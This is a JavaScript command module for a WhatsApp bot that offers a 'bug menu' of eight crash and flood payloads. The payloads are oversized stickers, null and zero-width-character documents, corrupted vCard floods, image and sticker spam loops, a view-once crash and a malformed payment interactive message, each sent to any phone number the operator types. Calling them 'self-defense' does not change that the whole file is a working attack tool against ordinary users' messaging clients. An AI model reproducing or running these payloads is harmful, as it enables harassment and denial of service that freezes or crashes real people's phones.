const isOwnerOrSudo = require('../lib/isOwner');
const { toDoubleStruck, toMathStyle } = require('../lib/fonts');

function generateId() {
    return Math.random().toString(36).substring(2, 15);
}

function safeTarget(num) {
    const n = String(num).replace(/[^0-9]/g, '');
    return n.includes('@') ? n : n + '@s.whatsapp.net';
}

// ──────────────────────────────────────────────────────────────
// RAIDEN-STYLE BUG PAYLOADS (from XeonBug8 study)
// ──────────────────────────────────────────────────────────────

// 1. FREEZE ─ Oversized sticker crash
async function Freeze(sock, target) {
    try {
        const msg = {
            stickerMessage: {
                url: 'https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK',
                fileSha256: 'SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=',
                fileEncSha256: 'l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=',
                mediaKey: 'UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=',
                mimetype: 'image/webp',
                directPath: '/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK',
                fileLength: '999999999999',
                mediaKeyTimestamp: '1775044724',
                stickerSentTs: '1775044724091',
                stickerName: 'ZENITH LABS FREEZE \u1d40\u1d39\u1d3a\u1d3c\u1d3a\u1d3b\u02e2 \u1d3f\u1d3c\u1d42\u1d3c\u1d4b\u02b3\u1d3a\u1d3c\u1d42\u1d4b \u1d3b\u1d40\u1d4b\u1d3c\u1d42\u1d4b \u1d43\u1d3c\u1d4b\u1d4b\u1d42\u1d3c\u1d42' + '\ua9fe'.repeat(50000),
                publisher: '\ua9fe'.repeat(5000),
                packDescription: '\u0000'.repeat(30000),
                stickerPackSize: 3680054999,
                stickerPackOrigin: 'USER_CREATED',
                contextInfo: {
                    mentionedJid: Array(1000).fill(target),
                    isForwarded: true,
                    forwardingScore: 999999999
                }
            }
        };
        await sock.relayMessage(target, msg, { messageId: generateId() });
        return '\u2705 Freeze delivered';
    } catch (err) {
        return '\u274c Freeze failed: ' + err.message;
    }
}

// 2. NULL CRASH ─ Null document with zero-width chars
async function NullCrash(sock, target) {
    try {
        const msg = {
            documentMessage: {
                url: 'https://mmg.whatsapp.net/o1/v/t24/f2/m238/null',
                mimetype: 'application/octet-stream',
                fileName: '\u0000'.repeat(5000) + '.exe',
                fileLength: '999999999999',
                pageCount: 999999,
                mediaKey: 'UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=',
                directPath: '/o1/v/t24/f2/m238/null',
                caption: '\u0000'.repeat(50000),
                contextInfo: {
                    mentionedJid: Array(1000).fill(target),
                    isForwarded: true,
                    forwardingScore: 999999999
                }
            }
        };
        await sock.relayMessage(target, msg, { messageId: generateId() });
        return '\u2705 NullCrash delivered';
    } catch (err) {
        return '\u274c NullCrash failed: ' + err.message;
    }
}

// 3. DOC SPAM ─ Oversized PDF spam
async function DocSpam(sock, target, count = 5) {
    let sent = 0;
    for (let i = 0; i < count; i++) {
        try {
            const msg = {
                documentMessage: {
                    url: 'https://mmg.whatsapp.net/v/t62.7118-24/null',
                    mimetype: 'application/pdf',
                    fileName: '\u200b'.repeat(30000) + '.pdf',
                    fileLength: '999999999999',
                    pageCount: 999999,
                    jpegThumbnail: Buffer.alloc(99999),
                    caption: '\u200b'.repeat(30000),
                    contextInfo: {
                        mentionedJid: Array(100).fill(target),
                        isForwarded: true,
                        forwardingScore: 999999999
                    }
                }
            };
            await sock.relayMessage(target, msg, { messageId: generateId() });
            sent++;
            await new Promise(r => setTimeout(r, 300));
        } catch (e) {}
    }
    return '\u2705 DocSpam: ' + sent + '/' + count;
}

// 4. VCARD FLOOD ─ 100 corrupted vCards
async function VCardFlood(sock, target) {
    try {
        const targetNum = String(target).split('@')[0];
        const vcards = Array(100).fill(0).map((_, i) => ({
            displayName: '\u200b'.repeat(5000) + i,
            vcard: 'BEGIN:VCARD\nVERSION:3.0\nFN:' + '\u200b'.repeat(5000) + '\nTEL;type=CELL;type=VOICE;waid=' + targetNum + ':' + targetNum + '\nEND:VCARD'
        }));
        const msg = {
            contactsArrayMessage: {
                displayName: '\u200b'.repeat(5000),
                contacts: vcards
            }
        };
        await sock.relayMessage(target, msg, { messageId: generateId() });
        return '\u2705 VCardFlood delivered (100 contacts)';
    } catch (err) {
        return '\u274c VCardFlood failed: ' + err.message;
    }
}

// 5. IMAGE LOOP ─ Oversized image loop
async function ImageLoop(sock, target, count = 3) {
    let sent = 0;
    for (let i = 0; i < count; i++) {
        try {
            const msg = {
                imageMessage: {
                    url: 'https://mmg.whatsapp.net/v/t62.7118-24/null',
                    mimetype: 'image/jpeg',
                    caption: '\u200b'.repeat(30000) + '\n'.repeat(1000),
                    fileLength: '999999999',
                    jpegThumbnail: Buffer.alloc(99999),
                    contextInfo: {
                        mentionedJid: Array(100).fill(target),
                        isForwarded: true,
                        forwardingScore: 999999999
                    }
                }
            };
            await sock.relayMessage(target, msg, { messageId: generateId() });
            sent++;
            await new Promise(r => setTimeout(r, 300));
        } catch (e) {}
    }
    return '\u2705 ImageLoop: ' + sent + '/' + count;
}

// 6. STICKER BOMB ─ Sticker spam
async function StickerBomb(sock, target, count = 5) {
    let sent = 0;
    for (let i = 0; i < count; i++) {
        try {
            const msg = {
                stickerMessage: {
                    url: 'https://mmg.whatsapp.net/v/t62.7118-24/null.webp',
                    mimetype: 'image/webp',
                    fileLength: '999999999',
                    stickerName: '\ua9fe'.repeat(70000),
                    publisher: '\ua9fe'.repeat(5000),
                    contextInfo: {
                        mentionedJid: Array(100).fill(target),
                        isForwarded: true,
                        forwardingScore: 999999999
                    }
                }
            };
            await sock.relayMessage(target, msg, { messageId: generateId() });
            sent++;
            await new Promise(r => setTimeout(r, 300));
        } catch (e) {}
    }
    return '\u2705 StickerBomb: ' + sent + '/' + count;
}

// 7. VIEW ONCE CRASH ─ View-once with oversized payload
async function ViewOnceCrash(sock, target) {
    try {
        const msg = {
            imageMessage: {
                url: 'https://mmg.whatsapp.net/v/t62.7118-24/null',
                mimetype: 'image/jpeg',
                caption: '\u200b'.repeat(30000),
                fileLength: '999999999',
                jpegThumbnail: Buffer.alloc(99999),
                viewOnce: true,
                contextInfo: {
                    mentionedJid: Array(1000).fill(target),
                    isForwarded: true,
                    forwardingScore: 999999999
                }
            }
        };
        await sock.relayMessage(target, msg, { messageId: generateId() });
        return '\u2705 ViewOnceCrash delivered';
    } catch (err) {
        return '\u274c ViewOnceCrash failed: ' + err.message;
    }
}

// 8. RAIDEN HARDCORE ─ Force interactive message (from XeonBug8)
async function RaidenHardcore(sock, target) {
    try {
        const forcePayload = {
            key: {
                participant: '0@s.whatsapp.net',
                remoteJid: 'status@broadcast'
            },
            message: {
                interactiveMessage: {
                    header: {
                        hasMediaAttachment: true,
                        jpegThumbnail: Buffer.alloc(99999)
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            name: 'review_and_pay',
                            buttonParamsJson: '{"currency":"USD","total_amount":{"value":49981399788,"offset":100},"reference_id":"ZENITH","type":"physical-goods","order":{"status":"payment_requested","subtotal":{"value":49069994400,"offset":100},"tax":{"value":490699944,"offset":100},"discount":{"value":485792999999,"offset":100},"shipping":{"value":48999999900,"offset":100},"order_type":"ORDER","items":[{"retailer_id":"7842674605763435","product_id":"7842674605763435","name":"ZENITH LABS","amount":{"value":9999900,"offset":100},"quantity":999},{"retailer_id":"custom","name":"","amount":{"value":999999900,"offset":100},"quantity":999}]},"native_payment_methods":[]}'
                        }]
                    }
                }
            }
        };
        await sock.relayMessage(target, forcePayload.message, { participant: { jid: target }, messageId: generateId() });
        return '\u2705 Raiden Hardcore delivered';
    } catch (err) {
        return '\u274c Raiden Hardcore failed: ' + err.message;
    }
}

// ──────────────────────────────────────────────────────────────
// MAIN BUG MENU COMMAND
// ──────────────────────────────────────────────────────────────

async function bugMenuCommand(sock, chatId, message, args) {
    try {
        // FIX: Normalize senderId and check authorization
        const rawSender = message.key.participant || message.key.remoteJid || '';
        const senderId = String(rawSender);
        const isAuthorized = await isOwnerOrSudo(senderId, sock, chatId);
        if (!isAuthorized) {
            await sock.sendMessage(chatId, { text: '\u274c Owner / Sudo only.' }, { quoted: message });
            return;
        }

        // Show menu if no args
        if (!args[0]) {
            const ds = toDoubleStruck;
            const ms = toMathStyle;
            const menu = `
╔═════════════════════════════════════╗
║  🔥 ${ds('ZENITH LABS')} ═ ${ds('SELF DEFENSE')} ═ ${ds('BUG MENU')} 🔥  ║
╚═════════════════════════════════════╝

${ms('Use the commands below:')}

${ds('.bug-freeze')} <number>
├── Freeze target with oversized sticker

${ds('.bug-null')} <number>
├── Null document crash payload

${ds('.bug-doc')} <number> [count]
├── Spam oversized documents

${ds('.bug-vcard')} <number>
├── Flood with 100 corrupted vCards

${ds('.bug-img')} <number> [count]
├── Loop oversized image payloads

${ds('.bug-sticker')} <number> [count]
├── Sticker bomb attack

${ds('.bug-viewonce')} <number>
├── View-once crash payload

${ds('.bug-hardcore')} <number>
├── Raiden-style interactive crash (MAX)

⚠️ ${ms('FOR SELF-DEFENSE ONLY')}
© ${ms('Zenith Labs')} | zenith-labs-ten.vercel.app

🎭 Founder: Ezihe Chigorzim (Richard)
🖼️ Dev Site: https://zenith-labs-ten.vercel.app
📧 Contact: +234 814 291 3572
`;
            await sock.sendMessage(chatId, { text: menu }, { quoted: message });
            return;
        }

        // Execute bug command
        const subCmd = args[0].toLowerCase();
        const target = args[1];
        if (!target) {
            await sock.sendMessage(chatId, { text: 'Usage: .bugmenu <type> <number> [count]' }, { quoted: message });
            return;
        }
        const formattedTarget = safeTarget(target);

        let result = '';
        switch (subCmd) {
            case 'freeze': result = await Freeze(sock, formattedTarget); break;
            case 'null': result = await NullCrash(sock, formattedTarget); break;
            case 'doc': result = await DocSpam(sock, formattedTarget, parseInt(args[2]) || 5); break;
            case 'vcard': result = await VCardFlood(sock, formattedTarget); break;
            case 'img': result = await ImageLoop(sock, formattedTarget, parseInt(args[2]) || 3); break;
            case 'sticker': result = await StickerBomb(sock, formattedTarget, parseInt(args[2]) || 5); break;
            case 'viewonce': result = await ViewOnceCrash(sock, formattedTarget); break;
            case 'hardcore': result = await RaidenHardcore(sock, formattedTarget); break;
            default: result = '\u274c Unknown bug type. Use .bugmenu for list.';
        }
        await sock.sendMessage(chatId, { text: result }, { quoted: message });
    } catch (error) {
        console.error('BugMenu error:', error);
        await sock.sendMessage(chatId, { text: '\u274c BugMenu error: ' + (error.message || error) }, { quoted: message });
    }
}

module.exports = bugMenuCommand;
